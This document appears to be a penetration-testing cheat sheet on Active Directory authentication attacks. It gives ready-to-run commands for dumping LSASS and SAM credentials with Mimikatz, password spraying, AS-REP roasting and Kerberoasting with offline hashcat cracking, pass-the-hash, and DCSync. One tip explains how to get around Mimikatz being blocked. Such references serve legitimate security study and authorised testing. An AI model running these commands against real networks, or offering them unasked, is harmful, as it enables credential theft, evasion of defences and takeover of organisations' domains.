---
sidebar_position: 1
title: Authentication Attacks
---

# AD Authentication Attacks

## Cached Credentials (Mimikatz)

LSASS caches NTLM hashes and Kerberos tickets for logged-in users. Requires SYSTEM or Administrator privileges with `SeDebugPrivilege`.

Extract password hashes of all logged-in users:

```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

Extract Kerberos tickets from memory:

```powershell
sekurlsa::tickets
```

Elevate to SYSTEM token:

```powershell
token::elevate
```

Dump SAM database:

```powershell
lsadump::sam
```

:::tip
If Mimikatz is blocked, try renaming the executable, using an encoded/bypass script, or running it through an interactive logon (RDP) rather than WinRM.
:::

---

## Password Spraying

:::warning
Check the domain password policy first to avoid lockouts.
:::

Check password policy as a logged-in domain user:

```powershell
net accounts /domain
```

Pay attention to the lockout threshold AND the lockout observation window.

### SprayPasswords.ps1 (From Windows)

```powershell
.\SprayPasswords.ps1 -Pass $PASSWORD -Admin
```

The `-Pass` option sets a single password to test.

### NetExec (From Kali)

SMB spraying:

```bash
nxc smb $TARGET -u usernames.txt -p $PASSWORD --continue-on-success
```

:::tip
NetExec will also display if a successful user has admin privileges on the target.
:::

### Kerbrute (From Kali)

```bash
kerbrute passwordspray -d $DOMAIN --dc $TARGET usernames.txt $PASSWORD
```

---

## AS-REP Roasting

If a user account has "Do not require Kerberos preauthentication" enabled, you can request an AS-REP and crack it offline. This setting is disabled by default but sometimes enabled manually.

### From Kali (impacket)

```bash
impacket-GetNPUsers $DOMAIN/$USER -hashes :$HASH -request -format hashcat -outputfile hashes_asrep.txt
```

### From Windows (Rubeus)

```powershell
.\Rubeus.exe asreproast /nowrap
```

As a pre-authenticated domain user, Rubeus doesn't require specifying credentials.

### Cracking

```bash
hashcat -m 18200 hashes_asrep.txt /usr/share/wordlists/rockyou.txt
```

---

## Kerberoasting

When you have valid domain user credentials, you can request service tickets for accounts with SPNs and crack them offline.

### NetExec

```bash
nxc ldap $TARGET -u $USER -p $PASSWORD --kerberoast
```

Output goes to `$PWD/kerberoast/`. Optionally specify output file:

```bash
nxc ldap $TARGET -u $USER -p $PASSWORD --kerberoast --output kerberoast_hashes.txt
```

### Rubeus (From Windows)

```powershell
.\Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt
```

### Cracking

```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Pass-the-Hash (NetExec)

Works when you have an NTLM hash (usually in `LM:NT` or `aad3b435b51404eeaad3b435b51404ee:NT` format).

SMB enumeration with hash:

```bash
nxc smb $TARGET -u Administrator -H $HASH --shares
```

WinRM shell with hash:

```bash
nxc winrm $TARGET -u Administrator -H $HASH --exec whoami
```

:::tip
Add `--local-auth` if the hash is only valid for local accounts, not domain accounts.
:::

Verify WinRM is enabled before attempting PTH:

```bash
nxc winrm $TARGET -u '' -p '' --exec whoami
```

### Impacket PsExec with Hash

```bash
impacket-psexec -hashes 00000000000000000000000000000000:$HASH $USER@$TARGET
```

---

## DC Sync

Requires Domain Admin, Enterprise Admin, or accounts with Replicating Directory Changes rights.

### Mimikatz (From Windows)

```powershell
.\mimikatz.exe
privilege::debug
lsadump::dcsync /user:$DOMAIN\Administrator
```

### impacket-secretsdump (From Kali)

```bash
impacket-secretsdump $DOMAIN/$USER:$PASSWORD@$TARGET
```
